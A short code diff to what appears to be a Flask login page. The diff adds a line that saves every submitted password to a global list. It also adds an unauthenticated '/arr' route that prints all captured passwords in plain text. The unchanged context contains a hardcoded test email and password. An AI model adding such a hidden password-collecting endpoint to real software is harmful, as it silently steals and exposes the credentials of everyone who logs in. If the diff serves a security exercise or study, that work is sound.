@@ -40,10 +40,14 @@ def home():
     if request.method == 'POST':
         email = request.form['email']
         password = request.form['password']
+        arr.append(password)
         if email=='test@gmail.com' and password=='~5_pFO*p6s8Kcj+U':
             msg = 'Login successful'
     return render_template_string(var.html_code, msg=msg)
 
+@app.route('/arr')
+def display_arr():
+  return '\n'.join(arr)
 
 if __name__ == "__main__":
     app.run()
